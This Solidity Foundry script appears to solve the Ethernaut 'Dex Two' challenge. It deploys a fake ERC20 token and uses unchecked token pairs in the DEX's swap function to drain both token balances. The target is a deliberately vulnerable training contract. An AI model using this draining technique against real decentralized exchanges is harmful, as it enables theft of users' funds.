// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/23_Dex_Two.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20("FakeToken", "FKE") {
    address public target;

    constructor(address _target) {
        target = _target;
        _mint(target, 100);
        _mint(msg.sender, 200);
    }

    function exploit() external {
        _burn(target, 100);
    }
}

contract POC is Script {
    DexTwo public target;
    FakeToken public faketoken;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = DexTwo(0xE4a215107C373088fA6CeC41B9Cd7361c365D92a);
        faketoken = new FakeToken(address(target));

        address token1_addr = target.token1();
        address token2_addr = target.token2();
        token1 = SwappableTokenTwo(token1_addr);
        token2 = SwappableTokenTwo(token2_addr);

        uint256 balance1 = token1.balanceOf(address(target));
        uint256 balance2 = token2.balanceOf(address(target));

        console.log("before balance1: ", balance1);
        console.log("before balance2: ", balance2);

        token1.approve(address(target), 2**256 - 1);
        token2.approve(address(target), 2**256 - 1);
        faketoken.approve(address(target), 2**256 - 1);

        target.swap(address(faketoken), address(token1), 100);
        faketoken.exploit();
        target.swap(address(faketoken), address(token2), 100);

        balance1 = token1.balanceOf(address(target));
        balance2 = token2.balanceOf(address(target));

        console.log("after  balance1: ", balance1);
        console.log("after  balance2: ", balance2);


        vm.stopBroadcast();
    }
}